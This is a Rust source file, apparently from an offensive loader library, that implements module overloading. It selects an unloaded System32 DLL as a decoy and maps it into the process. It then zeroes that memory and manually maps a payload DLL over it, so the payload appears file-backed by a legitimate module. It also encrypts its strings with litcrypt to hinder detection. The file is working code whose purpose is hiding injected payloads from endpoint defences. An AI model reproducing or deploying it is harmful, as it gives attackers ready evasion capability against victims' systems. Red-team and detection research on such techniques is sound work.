#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use std::{env, fs, path::Path};
use bindings::Windows::Win32::Foundation::HANDLE;
use data::{PeMetadata, PVOID, PAGE_READWRITE, PeManualMap};
use winproc::Process;
use rand::Rng;

/// Locate a legitimate module of certain minimun size.
/// 
/// It will return the path of the selected module or an empty string in case 
/// that it fails to find a suitable module.
pub fn find_decoy_module (min_size: i64) -> String
{

    let directory_path =  format!("{}\\{}",env::var("WINDIR").unwrap(), "System32");
    let mut files:Vec<String> = vec![];
    for entry in fs::read_dir(directory_path).unwrap()
    {
        let p = entry.unwrap();
        let path = p.path();

        if !path.is_dir() &&  path.to_str().unwrap().ends_with(".dll")
        {
            let slice:Vec<String> = path.to_str().unwrap().to_string().split("\\").map(str::to_string).collect();
            files.push(slice[slice.len() - 1].to_string());
        }
    }

    let process = Process::current();
    let modules = process.module_list().unwrap();
    let mut remove: Vec<i32> = vec![];
    for m in modules
    {   
        let mut c = 0;
        for f in &files
        {
            if f.to_lowercase() == m.name().unwrap().to_lowercase()
            {
                remove.push(c);
            }
            c = c + 1;
        }
    }

    for r in remove
    {
        files.remove(r as usize);
    }

    let mut rng = rand::thread_rng();
    while files.len() > 0
    {
        let r = rng.gen_range(0..files.len());
        let path =  format!("{}\\{}\\{}",env::var("WINDIR").unwrap(), "System32", &files[r]);
        let size = fs::metadata(&path).unwrap().len() as i64;
        if size > (min_size * 2)
        {
            return path;
        }
        else
        {
            files.remove(r);
        }
    }


    "".to_string()
} 

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("Error ocurred: {}", e),      
/// }
/// ```
pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,i64), String>
{

    if !Path::new(payload_path).is_file()
    {
        return Err(lc!("[x] Payload file not found."));
    }


    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = overload_module(file_content, decoy_module_path)?;

    Ok(result)
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("Error ocurred: {}", e),      
/// }
/// ```
pub fn overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,i64), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file()
        {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        let decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len()
        {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }

    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == ""
        {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,i64) = overload_to_section(file_content, decoy_metadata.0)?;

        Ok(result)
}

/// Load a payload from memory to an existing memory section.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let section_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section("c:\\windows\\system32\\signedmodule.dll")?;
/// let module: (PeMetadata,i64) = overload_to_section(payload_content, section_metadata.0)?;
/// 
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("Error ocurred: {}", e),      
/// }
/// ```
pub fn overload_to_section (file_content: Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,i64), String>
{
    unsafe
    {
        let region_size: usize;
        if section_metadata.pe_info.is_32_bit
        {
            region_size = section_metadata.pe_info.opt_header_32.SizeOfImage as usize;
        }
        else
        {
            region_size = section_metadata.pe_info.opt_header_64.size_of_image as usize;
        }

        let size: *mut usize = std::mem::transmute(&region_size);
        let base_address: *mut PVOID = std::mem::transmute(&section_metadata.base_address);
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let r = dinvoke::nt_protect_virtual_memory(
            HANDLE { 0: -1}, 
            base_address, 
            size, 
            PAGE_READWRITE, 
            old_protection
        );

        if r != 0
        {
            return Err(lc!("[x] Error changing memory protection."));
        }
        
        dinvoke::rtl_zero_memory(*base_address, region_size);
        
        let module_ptr: *const u8 = std::mem::transmute(file_content.as_ptr());
        let pe_info = manualmap::get_pe_metadata(module_ptr)?;
        
        manualmap::map_module_to_memory(module_ptr, *base_address, &pe_info)?;
        manualmap::relocate_module(&pe_info, *base_address);
        manualmap::rewrite_module_iat(&pe_info, *base_address)?;
        manualmap::set_module_section_permissions(&pe_info, *base_address)?;

        Ok((pe_info, *base_address as i64))
    }
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair ((Vec<u8>,Vec<u8>),i64) containing the mapped PE's (payload)
/// content, the decoy module's content and the base payload base address or a string with a descriptive error messsage.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("Error ocurred: {}", e),      
/// }
/// ```
pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),i64), String>
{

    if !Path::new(payload_path).is_file()
    {
        return Err(lc!("[x] Payload file not found."));
    }


    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = managed_overload_module(file_content.clone(), decoy_module_path)?;

    Ok(((file_content, result.0), result.1))
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (Vec<u8>,i64) containing the decoy content and the payload base address or a string
/// with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("Error ocurred: {}", e),      
/// }
/// ```
pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,i64), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    let decoy_content;
    
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file()
        {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len()
        {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }
    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == ""
        {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,i64) = overload_to_section(file_content, decoy_metadata.0)?;

        Ok((decoy_content, result.1))
}
